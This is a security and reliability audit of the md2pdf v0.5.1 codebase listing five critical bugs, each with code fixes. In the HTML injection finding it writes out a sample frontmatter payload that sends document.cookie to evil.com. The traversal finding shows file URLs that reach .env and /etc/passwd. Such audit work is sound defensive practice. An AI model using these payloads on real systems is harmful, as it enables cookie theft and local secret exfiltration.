# CRITICAL BUGS — md2pdf v0.5.1 SSS-Tier Audit

> **Auditor:** Elite Staff-Level Architect & QA Automation Expert
> **Scope:** Full codebase — v0.5.1
> **Date:** 2026-07-13
> **Verdict:** 5 Critical, 8 Logical/Minor, 6 Obsidian/AST, 5 Mermaid/PDF, 4 NPM/Tooling

---

## BUG-C1 — `fs.readFileSync` in Hot Batch Loop (Event-Loop Blocking)

| Field | Detail |
|-------|--------|
| **Severity** | CRITICAL |
| **File** | `src/cli/index.ts` |
| **Line** | 369 |
| **Category** | CLI Orchestration & Concurrency |

### Description

Inside the sequential `for` loop that processes every input file in batch mode, there is a **synchronous** `fs.readFileSync` call used to detect whether the file contains mermaid blocks before lazily initializing the shared Mermaid page:

```ts
// LINE 369 — src/cli/index.ts
const content = fs.readFileSync(input, 'utf-8');
if (isBatch && content.includes('```mermaid') && !globalMermaidPage) {
```

This is a **blocking call on the main thread inside an async context**. For a batch of 50+ large Markdown files, this introduces tens to hundreds of milliseconds of synchronous blocking per file, stalling the Node.js event loop entirely during each read. In Playwright-heavy workflows this is especially harmful because Playwright's IPC protocol with the browser subprocess relies on the event loop being free to receive messages. If the file is large (close to the 5MB limit validated in `core/index.ts`) this single call can block for 150-400ms.

The irony is that `core/index.ts` already reads the file correctly using `await fs.readFile(inputPath, 'utf-8')` (async). The CLI is re-reading the same file synchronously solely for a heuristic check that is already done again inside `core/index.ts`.

### Root Cause

The mermaid-page initialization is gated on a quick scan of the file content. The developer reached for `readFileSync` for simplicity but forgot this runs inside an `async` action handler where `await` is available.

### SSS-Tier Fix

```ts
// BEFORE (line 369) — BLOCKING
const content = fs.readFileSync(input, 'utf-8');
if (isBatch && content.includes('```mermaid') && !globalMermaidPage) {

// AFTER — non-blocking, reads only the first 64KB for the heuristic
async function fileContainsMermaid(filePath: string): Promise<boolean> {
  return new Promise((resolve) => {
    const stream = createReadStream(filePath, { encoding: 'utf-8', highWaterMark: 65536 });
    stream.once('data', (chunk) => { stream.destroy(); resolve((chunk as string).includes('```mermaid')); });
    stream.once('error', () => resolve(false));
    stream.once('end', () => resolve(false));
  });
}

const hasMermaid = await fileContainsMermaid(input);
if (isBatch && hasMermaid && !globalMermaidPage) {
```

**Better alternative:** Remove the pre-scan entirely. The `mermaidBlocks` array populated during `parseMarkdown` is already the authoritative source. Defer the lazy Mermaid page init into `processBeforeRender`.

---

## BUG-C2 — Mermaid BrowserContext Leak on Batch Interrupt

| Field | Detail |
|-------|--------|
| **Severity** | CRITICAL |
| **File** | `src/cli/index.ts` |
| **Lines** | 348-355, 488-491 |
| **Category** | Playwright Zombie Processes |

### Description

The `SIGINT` handler at line 349 closes `globalBrowser` but **never closes `globalMermaidPage`'s context**:

```ts
// LINE 349-354 — src/cli/index.ts
process.on('SIGINT', async () => {
  if (globalBrowser) {
    await globalBrowser.close().catch(() => {});  // closes browser
  }
  process.exit(130);
  // globalMermaidPage's BrowserContext is NEVER explicitly closed
});
```

The shared `globalMermaidPage` created in `cli/index.ts:371` uses `browser.newContext() -> context.newPage()`. This context is **never tracked** and **never explicitly closed** anywhere in the normal exit path, error path, or SIGINT handler. On Linux, the chromium subprocess may become a **zombie process** if it was mid-render when the signal arrived.

The `finally` block on line 489 only covers `globalBrowser` — not the mermaid context:

```ts
} finally {
  if (globalBrowser) {
    await globalBrowser.close();
  }
  // globalMermaidPage context never closed here either
}
```

### SSS-Tier Fix

```ts
// Track context at module scope:
let globalBrowser: Browser | undefined;
let globalMermaidContext: import('playwright-core').BrowserContext | undefined;
let globalMermaidPage: import('playwright-core').Page | undefined;

const cleanup = async () => {
  if (globalMermaidContext) await globalMermaidContext.close().catch(() => {});
  if (globalBrowser) await globalBrowser.close().catch(() => {});
};

process.on('SIGINT', async () => {
  await cleanup();
  process.exit(130);
});

// When creating (line 371):
globalMermaidContext = await globalBrowser.newContext({ deviceScaleFactor: 2 });
globalMermaidPage = await globalMermaidContext.newPage();

// In finally block:
} finally {
  await cleanup();
}
```

---

## BUG-C3 — `publish: false` Guard Breaks Batch Exit Code in CI

| Field | Detail |
|-------|--------|
| **Severity** | CRITICAL |
| **File** | `src/core/index.ts` |
| **Lines** | 85-93 |
| **Category** | CLI Orchestration / Batch Mode Correctness |

### Description

When a file has `publish: false` in its frontmatter, the code throws with `ERR_CONFIG_ERROR`:

```ts
// LINES 85-93 — src/core/index.ts
if (frontmatter.publish === false) {
  throw new Md2PdfError(
    Md2PdfErrorCode.ERR_CONFIG_ERROR,   // WRONG CODE — this is a skip, not an error
    'Skipped Conversion',
    'The file has `publish: false` in its frontmatter.',
  );
}
```

In the CLI batch handler (line 428-435), any caught error increments `failedCount++` and marks `hasErrors = true`, causing `process.exitCode = EXIT.USAGE_ERROR` (1). A batch of 10 files where 2 have `publish: false` exits with code 1, **breaking CI pipelines** that treat non-zero exit as failure. In `--json-errors` mode, the skip appears as `"success": false` — indistinguishable from a real conversion failure.

### SSS-Tier Fix

```ts
// 1. errors/index.ts — add dedicated code:
ERR_PUBLISH_SKIPPED = 'ERR_PUBLISH_SKIPPED',

// 2. core/index.ts — use dedicated code:
throw new Md2PdfError(
  Md2PdfErrorCode.ERR_PUBLISH_SKIPPED,
  'Skipped: publish: false',
  'The file has `publish: false` in its frontmatter.',
  { markdownFile: inputPath }
);

// 3. cli/index.ts — catch BEFORE generic error handling (line 428):
} catch (err: any) {
  if (err?.code === Md2PdfErrorCode.ERR_PUBLISH_SKIPPED) {
    results.push({ isSkipped: true, outputPath: output, pageCounts: 0,
                   renderTimeMs: 0, warnings: ['Skipped: publish: false'] });
    if (!options.jsonErrors) {
      console.log(pc.dim(`⏭ Skipped ${path.basename(input)} (publish: false)`));
    }
    continue; // do NOT increment failedCount
  }
  // ... existing error handling unchanged
```

---

## BUG-C4 — HTML Template Injection in Header/Footer via Raw Frontmatter

| Field | Detail |
|-------|--------|
| **Severity** | CRITICAL |
| **File** | `src/core/index.ts` |
| **Lines** | 209, 229 |
| **Category** | Security — HTML Injection |

### Description

The header and footer templates support `{frontmatter.X}` substitution. Frontmatter values are injected **without HTML escaping**:

```ts
// LINE 209 — src/core/index.ts
headerTemplate = headerTemplate.replace(
  /\{frontmatter\.([^}]+)\}/g,
  (match, key) => frontmatter[key] || ''  // RAW VALUE — no escaping!
);
// LINE 229 — identical pattern for footerTemplate
```

Playwright renders header/footer templates as trusted HTML. A Markdown file with malicious frontmatter:

```yaml
---
title: "<img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>"
author: "O'Reilly & Associates <media@oreilly.com>"
---
```

Will inject that HTML verbatim into the header, running in a real Chromium instance. Note: the PDF context in `pdf/index.ts` sets `javaScriptEnabled: false`, but `<img onerror>` fires independently of the `javaScriptEnabled` flag in some Chromium versions.

### SSS-Tier Fix

```ts
// Add helper in core/index.ts:
function sanitizeFrontmatterValue(val: unknown): string {
  if (val === null || val === undefined) return '';
  const str = Array.isArray(val) ? val.join(', ') : String(val);
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Apply to template substitution:
headerTemplate = headerTemplate.replace(
  /\{frontmatter\.([^}]+)\}/g,
  (match, key) => sanitizeFrontmatterValue(frontmatter[key])
);
// same for footerTemplate (line 229)
```

---

## BUG-C5 — `file://` Allowlist Bypassable via `..` Traversal + `allowDangerousHtml`

| Field | Detail |
|-------|--------|
| **Severity** | CRITICAL |
| **File** | `src/pdf/index.ts` |
| **Lines** | 49-54 |
| **Category** | Security — Path Traversal |

### Description

The route handler restricts `file://` URLs to `process.cwd()`:

```ts
// LINES 49-54 — src/pdf/index.ts
if (url.startsWith('file://')) {
  const allowedDir = 'file://' + process.cwd().replace(/\\/g, '/');
  if (!url.startsWith(allowedDir)) {
    return route.abort('accessdenied');
  }
}
```

**Three exploitable vectors:**

**Vector 1 — Raw string `startsWith` never normalizes `..` segments.**
A URL `file:///home/user/project/../../.env` passes the check if `cwd` is `/home/user/project` because the raw string starts with `file:///home/user/project`. The `..` segments are only resolved *after* the route handler sees the raw string.

**Vector 2 — `allowDangerousHtml: true` passes raw `<img>` tags.**
The unified pipeline passes raw HTML blocks straight through. A markdown file containing:
```html
<img src="file:///home/user/project/.env" />
```
passes the check (cwd prefix matches) and Playwright loads the `.env` file.

**Vector 3 — Case sensitivity on macOS/Windows.**
`process.cwd()` returns `/Users/Alice/Project`. A URL `file:///users/alice/project/../../etc/passwd` may match the lowercase prefix after browser normalization on case-insensitive filesystems.

### SSS-Tier Fix

```ts
await page.route('**/*', (route: Route) => {
  const url = route.request().url();

  // ... existing RFC-1918 checks (keep) ...

  if (url.startsWith('file://')) {
    try {
      const rawPath = decodeURIComponent(new URL(url).pathname);
      const resolvedPath = path.resolve(rawPath);      // eliminates ../
      const allowedDir  = path.resolve(process.cwd()); // normalize cwd too

      const isAllowed =
        resolvedPath.startsWith(allowedDir + path.sep) ||
        resolvedPath === allowedDir;

      if (!isAllowed) return route.abort('accessdenied');
    } catch {
      return route.abort('accessdenied');
    }
  }

  route.continue();
});
```

---

## Summary Table

| ID | File | Line(s) | Issue | Risk |
|----|------|---------|-------|------|
| C1 | `src/cli/index.ts` | 369 | `readFileSync` in async batch loop | Event-loop stall |
| C2 | `src/cli/index.ts` | 349-491 | Mermaid BrowserContext never closed | Zombie Chromium |
| C3 | `src/core/index.ts` | 85-93 | `publish: false` sets wrong exit code | CI pipeline failures |
| C4 | `src/core/index.ts` | 209, 229 | Frontmatter injected raw into HTML | Stored XSS in renderer |
| C5 | `src/pdf/index.ts` | 49-54 | `file://` check bypassed by `..` paths | Local file exfiltration |
